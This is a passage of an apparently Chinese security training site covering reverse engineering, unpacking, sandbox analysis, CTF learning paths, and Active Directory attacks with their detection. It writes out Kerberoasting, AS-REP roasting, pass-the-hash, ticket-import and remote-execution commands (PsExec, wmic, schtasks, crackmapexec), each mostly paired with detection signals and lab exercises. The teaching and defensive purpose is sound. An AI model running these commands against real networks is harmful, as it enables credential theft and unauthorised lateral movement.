| `RegSetValue` | 改注册表（持久化） |
| `InternetOpen` / `WinHttpOpen` | 网络通信（C2） |
| `CryptEncrypt` | 加密（勒索/通信加密） |
| `IsDebuggerPresent` | 反调试 |

**逆向往往从导入表开始**，因为这是「作者无法隐藏的意图」。

## 四、重定位与 ASLR

PIE / DLL 会被加载到随机基址，代码里的绝对地址需要修正——这就是**重定位表**（ELF `.rela.dyn`，PE `.reloc`）。

```bash
readelf -r ./a.out | head
```

如果程序完全位置无关（PIC），重定位会很少；反之说明大量硬编码地址，逆向时可以直接按基址换算。

## 五、.bss 与 .data 的差别（常被问）

```c
int g1 = 42;      // .data：文件里存 42
int g2;           // .bss：文件里不存，加载时清零
static int g3;    // .bss（或 .data，取决于是否初始化）
```

`.bss` 不占文件体积，只占内存——这也是「文件很小但内存很大」的原因。

## 六、实操：三分钟搞清一个陌生 ELF

```bash
file ./sample                 # 架构、是否 stripped、是否静态链接
readelf -h ./sample           # 入口地址
readelf -l ./sample | grep -A2 LOAD   # 段权限（有无可写可执行）
strings -a -n 6 ./sample | head -30   # 可疑字符串
objdump -T ./sample | head -20        # 动态符号（若未 strip）
```

四步之后，你至少知道：它是 32/64 位、动态还是静态、有没有开 NX、用了哪些库、里面有没有明显的 URL 或提示语。

## 七、练习

1. 用 `readelf` 逐段打印一个你自己编译的程序，标出 `.text` `.data` `.bss` 的位置
2. 用 PEBear 打开一个 Windows 程序，找到入口 RVA 并换算成文件偏移
3. 找一个静态链接的程序，比较它与动态链接版本在 `readelf -d` 上的差异

## 一句话总结

文件格式是**逆向的地图**：头部告诉你从哪开始，节区告诉你代码与数据在哪，导入表告诉你它想干什么。
</script>


<script type="text/markdown" id="md-rev-packing">
加壳的目的有两类：**压缩体积**（UPX 这类）与**对抗分析**（商业壳、恶意样本壳）。识别壳是逆向的第一步。

## 一、加壳做了什么

```
原程序 → 壳的 stub + 加密/压缩后的原始代码
运行时：stub 先执行 → 在内存里解出原始代码 → 跳到 OEP
```

因此磁盘上的 `.text` 往往是「看不懂的字节」，真正的指令在内存里才出现。

## 二、三种判断方法

**1. 区段名**

| 壳 | 典型区段 |
| --- | --- |
| UPX | `UPX0` `UPX1` |
| ASPack | `.aspack` `.adata` |
| Themida | `.themida` `.winlice` |
| VMProtect | `.vmp0` `.vmp1` |

ELF 侧不叫「区段名」，但常见特征是高熵的 `.text` + 极小的入口段。

**2. 熵值**

压缩/加密后的数据熵接近 8.0（随机）。正常代码段熵通常 5.5–6.5。

```python
import math, collections
def entropy(data):
    if not data: return 0
    c = collections.Counter(data)
    return -sum((n/len(data)) * math.log2(n/len(data)) for n in c.values())
```

用 PEiD / DIE（Detect It Easy）可以直接看每个节的熵。

**3. 导入表异常**

加壳样本的导入表往往只有 `LoadLibrary` / `GetProcAddress` 寥寥几个——因为真正的 API 要运行时动态解析。

## 三、UPX：一行命令的常规脱壳

```bash
upx -d packed.exe -o unpacked.exe    # 自动脱壳
```

能这么简单，是因为 UPX 是「公开格式的压缩壳」，`upx -d` 知道怎么还原。**遇到非 UPX 就不行了**。

## 四、手工脱壳：两步核心

**第一步：找 OEP（Original Entry Point）**

思路：壳 stub 解压完会跳到原始入口。常见定位法：

1. **ESP 定律**：在壳入口处对 `ESP` 下硬件断点，运行到 `ESP` 被访问时停下，通常已接近 OEP
2. **单步跟跳**：跟过几个大跳转（`jmp eax` / `call [esp]`）
3. **区段断点**：在「解压目标区段」下执行断点
4. **内存扫描**：找 `MZ`/`PE` 头（进程镂空类样本）

**第二步：dump 并修复**

- 在 OEP 处 dump 进程内存（OllyDumpEx / Scylla）
- **修复 IAT**（导入地址表）：Scylla 自动搜索，多数壳可一键修复
- 修正入口点与节表，另存为新文件

## 五、ELF 侧的做法

```bash
# 判断是否加壳
readelf -S ./sample | grep -E "UPX|packed"
# 若 UPX 压缩
upx -d ./sample -o unpacked
```

ELF 手工脱壳更常出现在 CTF 与 Linux 恶意样本（如挖矿木马）中，思路与 PE 一致：找 OEP、dump、修 ELF 头。

## 六、脱不掉怎么办：退而求其次

| 情况 | 替代方案 |
| --- | --- |
| 强壳（VMProtect/Themida） | 放弃静态，改**动态行为分析** |
| 反调试很强 | 用内核级调试器或 patch 反调试检测 |
| 只有一小段关键逻辑 | **只 dump 解密后的内存段**，不追求完整还原 |
| 分析目标是行为 | 沙箱跑行为日志，比脱壳更快 |

**分析的目的不是「脱壳成功」，而是「搞清它做什么」**。能通过沙箱拿到行为链，就不必死磕脱壳。

## 七、防御与检测视角

1. **静态检测**：区段名、熵值、导入表稀少、入口点不在 `.text`
2. **动态检测**：进程内存出现 `MZ` 头（镂空）、`VirtualProtect` 改内存为可执行、短时间内大量解密
3. **企业侧**：限制未签名程序执行、开启 AMSI/ETW 监控

## 八、练习

1. 用 UPX 压一个自己写的小程序，再 `upx -d` 还原，比较两个版本的节表
2. 计算两者的节熵，验证「加壳后熵显著升高」
3. 找一个教学用的加壳样本，用 ESP 定律定位 OEP（只在隔离虚拟机里做）

## 一句话总结

加壳是**把代码藏到运行时**。识壳靠区段名与熵，脱壳靠 OEP + dump + 修 IAT；脱不掉就换动态分析，别和壳死磕。
</script>


<script type="text/markdown" id="md-rev-sandbox">
动态分析能拿到静态看不到的东西：**它到底做了什么**。但前提是环境绝对隔离。

## 一、环境搭建：四条硬要求

1. **完全断网**（或用 InetSim 模拟网络）——样本联网会暴露你的 IP，也可能被用作攻击源
2. **虚拟机 + 快照**——每次分析前回滚，分析完销毁
3. **不装共享文件夹、不挂载宿主机目录**——防横向与数据外泄
4. **关闭自动运行**：U 盘、网络共享、宏

```
推荐组合：
  VMware / VirtualBox + Windows 10（含 Office、常见运行库）
  + Process Monitor / Process Hacker / Wireshark / x64dbg / Fiddler
  + 快照：干净初始态
```

## 二、五类必采证据

| 类别 | 工具 | 看什么 |
| --- | --- | --- |
| 进程 | Process Monitor / Process Hacker | 创建的子进程、注入、命令行 |
| 文件 | Procmon 过滤 Write/Delete | 落地路径、伪装扩展名、自删除 |
| 注册表 | Procmon 过滤 RegSetValue | 开机启动、服务、劫持 |
| 网络 | Wireshark / Fiddler / DNS 日志 | C2 域名、协议、心跳间隔 |
| 持久化 | Autoruns | 启动项、计划任务、服务 |

**时间线**是最终产物：把五类证据按时间排开，就是攻击的叙事线。

## 三、一次标准分析流程

```
1. 快照回滚 → 启动监控（Procmon + Wireshark）
2. 静态初判：strings、导入表、熵值（判断是否加壳）
3. 运行样本，观察 3-5 分钟（有的样本会延迟触发）
4. 记录：新进程树、落地文件、注册表变更、外连 IP/域名
5. 关键行为点用 x64dbg 跟进去，确认参数与目的
6. 生成 IOC：文件哈希、域名、IP、注册表键、互斥体
7. 回滚快照，写报告
```

## 四、如何从行为还原意图

| 行为组合 | 推断 |
| --- | --- |
| `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread` | 进程注入 |
| `RegSetValue` 写 `Run` 键 + 复制自身到 `%AppData%` | 持久化 |
| 大量文件写 + 扩展名改成 `.locked` + 删除卷影副本 | 勒索软件 |
| 定时外连 + 小流量 + 加密载荷 | C2 心跳 |
| 读取浏览器 `Login Data` + 打包压缩 | 信息窃取 |

**单一行为不构成结论，组合才有意义。**

## 五、样本的反沙箱手段

| 手法 | 表现 | 应对 |
| --- | --- | --- |
| 检测虚拟机 | 查注册表、MAC 前缀、进程名 | 改配置、去特征 |
| 检测调试器 | `IsDebuggerPresent`、`NtQueryInformationProcess` | 隐藏调试器、patch 检测 |
| 延迟执行 | `Sleep(300000)` | 加速时钟、跳过 Sleep |
| 检查用户交互 | 鼠标是否移动、窗口数量 | 自动化交互 |
| 检查域名/语言 | 特定地区不执行 | 调整环境区域 |
| 检测沙箱工具 | 进程名含 `procmon` | 重命名工具 |

遇到「跑起来什么都不做」，八成是反沙箱生效了——**这本身就是重要情报**。

## 六、IOC 与检测规则

```
文件：SHA256
网络：域名、IP、URI 路径、User-Agent
主机：落地路径、注册表键、互斥体名、服务名
行为：命令行特征、父子进程关系
```

转成检测规则（伪代码）：

```
process.created
  AND parent.name == "winword.exe"
  AND cmdline CONTAINS "powershell -enc"
  → 高危：Office 派生 PowerShell
```

## 七、法律与伦理

- 样本只在自己控制的隔离环境分析
- 不上传样本到公开平台除非确认合规（可能含受害者数据）
- 分析报告用于防护与研判，不外传可执行样本

## 八、练习

1. 搭一个断网 VM，用 Procmon 记录「记事本保存文件」的全部行为，熟悉过滤
2. 用 InetSim 模拟 DNS/HTTP，观察样本的外连请求
3. 拿一个公开的教学样本（如 EICAR 或 CTF 样本），产出 IOC 清单与行为时间线

## 一句话总结

沙箱分析的价值在**证据链**：把进程、文件、注册表、网络四条线按时间对齐，意图自然浮现。隔离是底线，快照是保险。
</script>


<script type="text/markdown" id="md-ctf-web-route">
CTF 的 Web 方向有一个特点：**入门门槛低，天花板极高**。前者让人上瘾，后者让人放弃。区别在于有没有路线。

## 一、阶段一：三类基础题（2-4 周）

| 题类 | 核心 | 判断信号 |
| --- | --- | --- |
| 文件包含 / 读取 | 路径可控 | 参数像 `?file=xxx.php` |
| SQL 注入 | 拼接与过滤 | 报错、布尔差异、时间延迟 |
| 弱口令 / 源码泄露 | 信息收集 | `.git`、`www.zip`、备份文件 |

**训练方式**：每道题写三样东西——payload、为什么有效、对应防御怎么改。只写 payload 等于没学。

**必备工具**：Burp Suite（抓包改包）、dirsearch（目录）、sqlmap（验证注入，但先手注一遍再用）。

## 二、阶段二：五类进阶题（4-8 周）

| 题类 | 关键点 |
| --- | --- |
| XSS | 不同上下文（HTML/属性/JS/URL）的绕过 |
| SSRF | 内网探测、协议切换、DNS 重绑定 |
| 反序列化 | 找利用链（POP chain），读框架源码 |
| 文件上传 | 后缀/MIME/内容/条件竞争 |
| 代码审计（PHP/Java） | 从入口追到危险函数 |

这一阶段的瓶颈通常不是「不会打」，而是**读不懂源码**。建议同步补 PHP 与 Java Web 基础。

## 三、阶段三：利用链与真实感（长期）

- **多条漏洞组合**：XSS 打管理员 → 拿到后台 → 文件上传 getshell
- **框架级漏洞**：Shiro、Fastjson、Spring 的经典链
- **云与容器**：元数据接口、K8s 配置错误、镜像泄露
- **业务逻辑**：越权、并发、状态机绕过

到这一步，题目越来越像真实系统，考察的是**业务理解 + 工程能力**。

## 四、每日训练量怎么安排

```
工作日：1 题 + 15 分钟复盘（写笔记）
周末：1 套小型比赛（4 小时）+ 补做没解出的题
每周：整理「本周新学到的 3 个技巧」进自己的知识库
```

**不要刷量**。做 10 题不写复盘，不如做 3 题写透。

## 五、复盘模板（每道题都填）

```
题目 / 平台：
入口点：哪个参数、什么功能
判断过程：我看到什么信号，推断出什么
利用步骤：1) 2) 3)
卡点：卡在哪、后来怎么想到的
对应知识点：归到哪个类别
防御：如果我是开发，怎么修
```

「卡点」那一栏最重要——它是你下次能突破的地方。

## 六、常见误区

| 误区 | 后果 |
| --- | --- |
| 只收藏 payload 不写原理 | 换个过滤就废 |
| 一上来丢 sqlmap | 不懂注入点判断，遇到 WAF 就懵 |
| 只做本地靶场 | 缺少真实系统的复杂度 |
| 不做笔记 | 三个月后忘光 |
| 不学开发 | 读不懂源码，进不了审计题 |

## 七、把 CTF 能力和就业接起来

- **Web 渗透岗**：CTF Web 题 + SRC 挖洞 + 报告能力
- **安全研发**：把题里的攻击转成检测规则（WAF 规则、扫描器插件）
- **代码审计岗**：多读开源框架，练「从入口追到 sink」

CTF 给你的是**攻击视角**，就业还需要**工程与表达能力**。

## 八、练习

1. 给自己排一份 8 周计划：每周 2 个题类，每类 5 题
2. 把最近 3 道题的复盘按上面模板补齐
3. 选一道你做过的题，写「如果我是开发怎么防」的修复方案

## 一句话总结

CTF Web 的成长曲线 = **题量 × 复盘深度**。没有复盘，题量只是重复劳动。
</script>


<script type="text/markdown" id="md-ctf-pwn-route">
Pwn 的门槛比 Web 高，但路线其实很清楚：**先会看保护，再会打栈，最后进堆**。

## 一、阶段零：必备地基（2-3 周）

| 内容 | 掌握到什么程度 |
| --- | --- |
| x86-64 汇编 | 能读懂函数序言、`lea`、`call`、`ret` |
| 调用约定 | 前六个参数用哪些寄存器 |
| 内存布局 | 代码段/数据段/栈/堆的位置与权限 |
| gdb + pwndbg | 断点、看栈、看寄存器、`vmmap` |
| pwntools | `remote`/`process`、`p64`、`cyclic`、`ELF` |

这一阶段别急着做题，**先把「看懂崩溃现场」练熟**：拿到一个 `SIGSEGV`，能说出 `rip` 和 `rsp` 各是什么。

## 二、阶段一：栈题五套路（4-6 周）

| 套路 | 触发条件 | 关键动作 |
| --- | --- | --- |
| ret2text | 程序里有现成的 `system("/bin/sh")` 或后门函数 | 算偏移，跳到函数 |
| ret2shellcode | 栈可执行（`-z execstack`） | payload 前置 shellcode |
| ret2libc | NX 开、有 `puts`/`write` | 泄露 libc 基址，第二轮 `system` |
| ret2csu | 缺 `pop rdi` | 用 `__libc_csu_init` 两段 gadget |
| 格式化字符串 | `printf(buf)` | 任意读（泄露）/ 任意写（改 GOT） |

**每类的固定流程**：`checksec` → 算偏移 → 找 gadget → 构造 → 本地跑通 → 打远程。

## 三、阶段二：绕过保护（3-4 周）

- **Canary**：泄露（格式化字符串/越界读）或爆破（fork 服务）
- **PIE**：先泄露代码地址，再算基址
- **ASLR**：靠泄露；32 位可爆破
- **Full RELRO**：GOT 不可写 → 转 `__malloc_hook` / FSOP / 栈上 ROP

## 四、阶段三：堆利用入门（6-10 周）

堆题的难点是**理解分配器的行为**，不是记 payload。

必学概念：

```
chunk 结构：prev_size / size / fd / bk
bin 分类：fastbin / tcache / unsorted / small / large
关键操作：malloc 合并、free 入 bin、tcache 复用
```

入门顺序建议：

1. **UAF**（Use After Free）：free 后仍能读写
2. **double free**：同一 chunk 释放两次
3. **tcache poisoning**：改 `next` 指针，让下一次 malloc 返回任意地址
4. **unsorted bin attack / house of 系列**：理解为主，题目遇到再深挖

**必备工具**：`pwndbg` 的 `heap`/`bins` 命令、`patchelf` 指定 libc 版本。

## 五、训练节奏

```
每周：2 道栈题 + 1 道堆题（新手先只刷栈）
每题：写 writeup，含「保护 → 偏移 → 链 → 结果」四段
每月：重做一次做不出的题
```

## 六、环境与工具清单

```bash
pip install pwntools
# gdb 插件
git clone https://github.com/pwndbg/pwndbg && cd pwndbg && ./setup.sh

# 换 libc 版本
patchelf --set-interpreter ./ld-2.31.so --set-rpath . ./pwn
```

`one_gadget` 用来找 libc 里「一次调用就拿 shell」的地址，省掉构造链：

```bash
one_gadget ./libc.so.6
```

## 七、常见卡点

| 卡点 | 原因 | 解法 |
| --- | --- | --- |
| `movaps` 崩溃 | 栈没 16 字节对齐 | 链里多插一个 `ret` |
| 本地通远程崩 | libc 版本不同 | 用题目给的 libc + `patchelf` |
| 泄露拿不到 | 输出被截断 | 用 `recvuntil` 精确截取 |
| 偏移算错 | 混淆了缓冲大小与到返回地址的距离 | 用 `cyclic` 实测 |
| 堆题看不懂 | 没画图 | 每次操作后 `heap` 打印并画出来 |

## 八、练习

1. 按「ret2text → ret2libc → ret2csu」顺序各做 3 题，写 writeup
2. 对一个开了 Canary 的题，练习通过格式化字符串泄露 canary
3. 用 pwndbg 观察一次 `free` 后 chunk 进入 tcache 的全过程

## 一句话总结

Pwn 的成长路径是**层层加条件**：会栈 → 会绕过 → 会堆。每层的核心都是「看懂内存里发生了什么」。
</script>


<script type="text/markdown" id="md-ctf-crypto-route">
Crypto 题的分布很极端：一半是「一眼看出是编码」，一半是「数学看不懂」。中间的过渡靠分类训练。

## 一、第一层：识别（1-2 周）

**先会认，再会谈**。常见特征：

| 特征 | 可能是什么 |
| --- | --- |
| 全大写 + `=` 结尾 | Base64（或 Base32 无 `=`） |
| 只有 `0-9a-f` | Hex |
| 一长串 0/1 | 二进制 / Bacon |
| 字母频率像英文但读不懂 | 凯撒 / 维吉尼亚 / 替换 |
| `%xx%xx` | URL 编码 |
| 中文乱码但像 `&#x4f60;` | HTML 实体 |

工具：CyberChef（拖拽式，支持链式操作）是这一层的瑞士军刀。

## 二、第二层：古典密码（2-3 周）

- **凯撒/ROT**：爆破 25 种偏移
- **维吉尼亚**：先猜密钥长度（Kasiski / 重合指数），再分组爆破
- **仿射**：枚举 `a` 的可逆值
- **栅栏/培根/摩斯**：看结构特征
- **Playfair/Hill**：按矩阵还原

这一层的训练价值在于**频率分析与假设验证**的思维方式，后面做现代密码同样用得上。

## 三、第三层：现代密码（长期）

### RSA 的五种常见场景

| 场景 | 条件 | 攻击思路 |
| --- | --- | --- |
| 小公钥指数 | `e=3` 且明文短 | 直接开三次方 |
| 共模攻击 | 同一 `n`，两个互素 `e` | 扩展欧几里得组合 |
| 广播攻击 | 同一明文、多个 `n`、小 `e` | CRT 合并后开方 |
| 因子分解 | `n` 小或有共用因子 | `gcd(n1, n2)` / yafu |
| 低解密指数 | `d` 很小 | Wiener 连分数攻击 |

```python
from math import gcd
# 两个模数共用素因子
p = gcd(n1, n2)
q1, q2 = n1 // p, n2 // p
```

### 对称密码

- **AES-ECB**：相同明文块 → 相同密文块，可做「字节翻转」与「块重排」
- **Padding Oracle**：靠解密报错逐字节还原明文
- **CBC 翻转**：改前一块密文影响后一块明文

### 其他

- **哈希长度扩展**：`hash(secret || msg)` 结构可被扩展
- **随机数预测**：`random` 用时间种子，或者 MT19937 状态可还原

## 四、第四层：数学与格（选学）

遇到「已知高位」「近似关系」类题目时，会用到：

- **Coppersmith**：已知 `p` 的高位，求小根
- **LLL 格基约减**：把「找小向量」转成线性代数
- **SageMath**：做这些计算的必备环境

```python
# SageMath 示例：小根求解
# P.<x> = PolynomialRing(Zmod(n))
# f = (known_high + x)^e - c
# f.small_roots(X=2^64, beta=0.4)
```

这一层不必强求，**遇到再学**，否则容易在数学里迷路。

## 五、训练方法：按「模式」刷，不按「题号」

每次做题后回答三个问题：

1. 这题属于哪一类（编码/古典/RSA 变体/对称/格）
2. 识别它的**信号是什么**（给了什么、缺了什么）
3. 如果参数换一组，思路还成立吗

把题目按「信号 → 攻击」做成对照表，比记 writeup 有用得多。

## 六、必备脚本（自己攒一个 `crypto.py`）

```python
from Crypto.Util.number import long_to_bytes, bytes_to_long, inverse
from math import gcd
from sympy.ntheory.modular import crt

def rsa_decrypt(c, d, n): return long_to_bytes(pow(c, d, n))
def common_modulus(c1, c2, e1, e2, n): ...
def broadcast(cs, ns, e): ...
```

写一次，之后每道题都能直接用——**这是 Crypto 方向最高性价比的投入**。

## 七、常见误区

| 误区 | 说明 |
| --- | --- |
| 上来就爆破 | 大多数题需要推导，不是算力 |
| 不写脚本 | 手算易错，脚本可复现 |
| 死磕数学 | 先看题目给了什么「多余信息」，往往就是突破口 |
| 只做 RSA | 对称密码与哈希题同样高频 |

## 八、练习

1. 用 CyberChef 把一段混合编码（Base64 → Hex → URL）解出来
2. 实现共模攻击与广播攻击脚本，各打一道题
3. 用 SageMath 跑一次小根求解，理解「已知高位」为什么可解

## 一句话总结

Crypto 题考的是**信息差**：题目多给或少给的那一点信息，就是攻击面。训练的目标是**看到参数就知道该试哪条路**。
</script>


<script type="text/markdown" id="md-intra-kerberos">
Kerberos 是 AD 域的认证基石。它的设计很精巧，但**每个环节的「可复用凭据」都成了攻击面**。

## 一、三个角色

| 角色 | 作用 |
| --- | --- |
| Client | 用户/服务，要访问资源 |
| KDC（域控） | 签发票据，含 AS 与 TGS 两个服务 |
| Service | 提供资源的服务（文件、数据库、HTTP） |

## 二、认证流程（简化但准确）

```
① AS-REQ  Client → KDC：我是 afei，用我的密码哈希加密一个时间戳
② AS-REP  KDC → Client：验证通过，发 TGT（用 krbtgt 哈希加密，含 PAC）
③ TGS-REQ Client → KDC：我要访问 HTTP/db.corp.local（带 TGT）
④ TGS-REP KDC → Client：发 Service Ticket（用服务账号哈希加密）
⑤ AP-REQ  Client → Service：出示 Service Ticket
```

两个关键点：

- **TGT 用 `krbtgt` 的哈希加密**：拿到 krbtgt 就等于能伪造任意身份（黄金票据）
- **Service Ticket 用服务账号哈希加密**：拿到服务账号哈希就能离线破解（Kerberoasting）

## 三、四种经典滥用

**1. Kerberoasting**

任何域用户都能请求任意 SPN 的 Service Ticket。票据用服务账号哈希加密 → 拿回来离线爆破。

```bash
# 请求 SPN 票据（需要已获得一个普通域用户）
GetUserSPNs.py corp.local/afei:pass -request -outputfile spn.txt
# 离线爆破
hashcat -m 13100 spn.txt rockyou.txt
```

**为什么成立**：设计如此——任何用户都能向 KDC 要票据。防御只能靠**服务账号用强口令 + 托管服务账号（gMSA）**。

**2. AS-REP Roasting**

对关闭「需要预认证」的账号，可以直接要 AS-REP，其中含用账号哈希加密的数据 → 离线爆破。

```bash
GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -format hashcat
hashcat -m 18200 hash.txt rockyou.txt
```

**3. 票据传递（PtT）**

拿到 TGT 或 Service Ticket 后直接导入，不再需要明文口令。

```bash
# Windows
kerberos::ptt ticket.kirbi        # mimikatz
# Linux
export KRB5CCNAME=/tmp/ticket.ccache
```

**4. 委派滥用**

| 类型 | 风险 |
| --- | --- |
| 非约束委派 | 可被诱导把 TGT 交给攻击者 |
| 约束委派 | 可伪造 S4U2Self/S4U2Proxy 访问被委派服务 |
| 基于资源的约束委派（RBCD） | 能改目标对象的 `msDS-AllowedToActOnBehalfOf` 即可滥用 |

## 四、票据类型与标志

| 票据 | 加密密钥 | 用途 |
| --- | --- | --- |
| 黄金票据 | krbtgt 哈希 | 伪造任意 TGT，长期有效 |
| 白银票据 | 服务账号哈希 | 伪造特定服务的票据，不经过 KDC |
| 钻石票据 | krbtgt + 合法 TGT | 修改 PAC 且签名合法 |

**黄金票据的本质**：既然 TGT 是 KDC 用 krbtgt 哈希签的，我有这个哈希就能自己签一张。

## 五、检测视角（这部分更重要）

| 攻击 | 可检测信号 |
| --- | --- |
| Kerberoasting | 4769 大量请求不同 SPN、加密类型为 RC4（0x17） |
| AS-REP Roasting | 4768 中「预认证未启用」的请求异常增多 |
| 黄金票据 | 4769 中票据有效期异常长、PAC 校验失败（4624 事件异常） |
| PtT | 同一账号在短时间内从多个主机出现 |
| 委派滥用 | 4662 修改 `msDS-AllowedToActOnBehalfOf`、S4U 请求异常 |

落地建议：
1. 开启 **Kerberos 审计**（4768/4769/4770）
2. 服务账号改 **gMSA**，口令 240 位自动轮换
3. 禁用 RC4，只允许 AES
4. krbtgt 定期轮换（两次，间隔大于最大票据寿命）
5. 监控「普通用户请求高权限 SPN」

## 六、练习

1. 在自建 AD 实验域里，用普通账号做一次 Kerberoasting，记录事件日志编号
2. 手工构造一个黄金票据（需 krbtgt 哈希），理解 PAC 的作用
3. 对照 4769 事件，写出「Kerberoasting 检测规则」的伪代码

## 一句话总结

Kerberos 的安全边界是**「谁能拿到加密票据、票据用什么密钥签」**。理解了这一点，四种攻击其实是同一个原理的不同入口。
</script>


<script type="text/markdown" id="md-intra-recon">
内网渗透的效率取决于**信息质量**。同样的入口，有人三小时到域控，有人一周还在打转，差别就在这张地图。

## 一、先看自己在哪

```bash
whoami /all            # Windows：当前用户、组、特权
systeminfo             # 系统版本、补丁、域
ipconfig /all          # 网段、DNS（DNS 往往指向域控）
route print
net view /domain       # 域内主机（需要域权限）
```

Linux 侧：

```bash
id; hostname -f; cat /etc/resolv.conf; ip a; ss -antp
```

**关键判断**：
- DNS 是否指向域控 → 说明这台机器已入域
- 是否有多个网段 → 可能存在隔离区，需要跳板
- 当前用户属于哪些组 → 决定后续能做什么

## 二、域内枚举的五个维度

| 维度 | 命令/工具 | 价值 |
| --- | --- | --- |
| 用户与组 | `net user /domain`、PowerView | 找高权限账号与服务账号 |
| 主机 | `net group "Domain Computers" /domain` | 找可横向目标 |
| 共享 | `net view \host`、`ShareFinder` | 找可读文件（配置、脚本、备份） |
| 会话 | `net session`、`quser` | 找「谁登录过这台机器」 |
| 信任 | `nltest /domain_trusts` | 跨域路径 |

PowerView 常用三连：

```powershell
Get-DomainUser -SPN                      # 有 SPN 的账号（Kerberoasting 目标）
Get-DomainGroupMember "Domain Admins"    # 域管成员
Find-LocalAdminAccess                    # 当前用户在哪些机器上是本地管理员
```

## 三、BloodHound：把关系变成图

BloodHound 的价值不是「收集」，而是**把 ACL、会话、组成员关系变成可搜索的路径**。

```bash
# 采集（SharpHound）
SharpHound.exe -c All -d corp.local
# 导入 Neo4j 后在 BloodHound 里查
```

三条必查的图查询：

1. **最短路径到域管**：`shortestPath((u:User {name:"AFEI@CORP.LOCAL"}), (g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}))`
2. **可写 ACL 的对象**：谁对哪些组有 `GenericAll` / `WriteDACL` / `ForceChangePassword`
3. **会话交叉**：哪些机器上有高权限用户的会话

**GenericAll / WriteDACL / WriteOwner / ForceChangePassword** 这四类 ACL 是内网提权的金矿——很多时候不需要漏洞，只需要一个权限配置错误。

## 四、把信息整理成攻击图

```
入口主机(10.0.1.23, 普通用户 afei)
 ├─ 可读共享 \fs01ackup → 发现 deploy.ps1 含服务账号口令
 ├─ afei 是 WS01 的本地管理员 → 可横向 WS01
 ├─ WS01 上有 DA 的会话 → 可用凭据提取
 └─ ACL: afei 对组 "Helpdesk" 有 GenericAll → 可加人 → 间接拿权限
```

**每一行都要有证据**（命令输出、截图）。这张图直接决定后面打哪条路。

## 五、容易被忽略的信息

| 位置 | 可能拿到什么 |
| --- | --- |
| 组策略（GPO） | 脚本、计划任务、部署口令 |
| 登录脚本 | 明文凭据（历史遗留极多） |
| `unattend.xml` / `sysprep.inf` | 本地管理员口令 |
| 浏览器保存的口令 | 直接可用的凭据 |
| 配置文件的连接串 | 数据库/API 凭据 |
| 运维文档、Wiki | 网络拓扑、账号规则 |

## 六、检测视角

| 行为 | 检测信号 |
| --- | --- |
| 大量 LDAP 查询 | 单个账号短时间内查询量异常 |
| SharpHound 采集 | 特定 LDAP 过滤器特征、进程名 |
| 枚举共享 | 4663 大量文件读取失败 |
| 本地管理员探测 | 4624 类型 3 失败激增 |

## 七、练习

1. 在自建实验域里跑一遍五个维度的枚举，输出成 CSV
2. 用 BloodHound 找出「从普通用户到域管」的最短路径，写出每一步依据
3. 检查实验域里是否有 `GenericAll` 配置错误，并说明如何修复

## 一句话总结

域内信息收集的目标是**画出攻击图**：我在哪、能到哪、缺哪一步凭据。图清楚了，路径自然浮现。
</script>


<script type="text/markdown" id="md-intra-lateral">
横向移动的本质是**用已获得的凭据或权限，去访问下一台机器**。手法有限，检测点也相对固定。

## 一、四类手法

| 类别 | 代表手段 | 依赖 |
| --- | --- | --- |
| 远程执行 | PsExec、WMI、WinRM、SMB 计划任务 | 管理员凭据 + 端口可达 |
| 凭据复用 | 哈希传递（PtH）、票据传递（PtT） | NTLM 哈希 / 票据 |
| 服务滥用 | 创建服务、修改服务路径 | 本地管理员 |
| 隧道代理 | 端口转发、SOCKS、DNS 隧道 | 一个立足点 |

## 二、远程执行：四种方式的痕迹

**PsExec**

```bash
PsExec.exe \target -u corp\admin -p pass cmd.exe
```

特征：在目标上创建并启动 `PSEXESVC` 服务，事件 7045（新服务）。

**WMI**

```bash
wmic /node:target process call create "cmd.exe /c whoami"
```

特征：`WmiPrvSE.exe` 派生异常子进程，4688 记录命令行。

**WinRM**

```bash
winrs -r:target cmd.exe
```

特征：5985/5986 连接，`wsmprovhost.exe` 启动。

**SMB 计划任务**

```bash
schtasks /create /S target /RU SYSTEM /TR "cmd.exe /c ..." /SC ONCE /ST 00:00
```

特征：任务创建事件 4698，目标机器上出现陌生任务。

## 三、凭据复用：两种传递

**哈希传递（PtH）**：不需要明文口令，NTLM 哈希就能认证。

```bash
# Linux 侧
crackmapexec smb 10.0.1.0/24 -u admin -H <NTLM_HASH>
```

特征：4624 类型 3 登录，**认证包为 NTLM 且无对应 4768（无 Kerberos 预认证）**。

**票据传递（PtT）**：导入 TGT/Service Ticket。

```bash
export KRB5CCNAME=/tmp/ticket.ccache
```

特征：同一账号短时间内从多台主机发起访问。

## 四、隧道与代理：为什么必须掌握

内网常有多网段隔离，需要把流量「搬」过去：

```bash
# 端口转发（本地 8080 → 目标内网 10.0.2.5:80）
ssh -L 8080:10.0.2.5:80 user@jump
# 或 chisel / frp / neo-reGeorg 建 SOCKS
```

选择原则：
- **HTTP 出网**：用 HTTP 隧道（隐蔽性最好）
- **只有 DNS 出网**：DNS 隧道（慢但能过）
- **能连 SSH**：直接 `-L/-D`，最简单

## 五、检测：四条主线

| 主线 | 具体信号 |
| --- | --- |
| 登录异常 | 4624 类型 3 激增、同一账号多主机登录、非工作时段 |
| 服务/任务 | 7045 新服务（PSEXESVC、随机名）、4698 新计划任务 |
| 进程异常 | `services.exe` 派生 cmd、`WmiPrvSE.exe` 派生 powershell |
| 网络异常 | 445/5985 横向扫描、内网 SMB 连接数突增 |

一条实用的关联规则（伪代码）：

```
事件 4624(类型3, NTLM) 在同一源 IP 于 10 分钟内出现 >= 5 个不同目标
  AND 目标主机此前无该账号登录记录
  → 高危：疑似哈希传递横向
```

## 六、蓝队的三道防线

1. **减少可复用凭据**：LAPS 管本地管理员口令、禁用 NTLM、限制本地管理员复用
2. **分段**：工作站不能直接访问服务器管理端口（445/135/5985）
3. **监控**：把 4624/4625/7045/4698 集中起来，做基线告警

## 七、红队视角的三条纪律

- 只在授权范围内横向，逐台记录时间与命令
- 优先用「合法工具」（LOLBins），但**不要清理日志**（那是破坏证据）
- 拿到目标证据即停，不扩大影响面

## 八、练习

1. 在实验域里用 PsExec 与 WMI 各横向一次，对照 7045/4688 日志
2. 写一条「哈希传递」的检测规则，说明误报来源与抑制方法
3. 用 chisel 建一条 SOCKS 隧道，观察流量特征

## 一句话总结

横向的三个要素是**凭据、通道、目标**。防守方要做的，是让这三样任何一个都难以获得——凭据不复用、通道被分段、目标有监控。
</script>


<script type="text/markdown" id="md-win-kernel-basics">
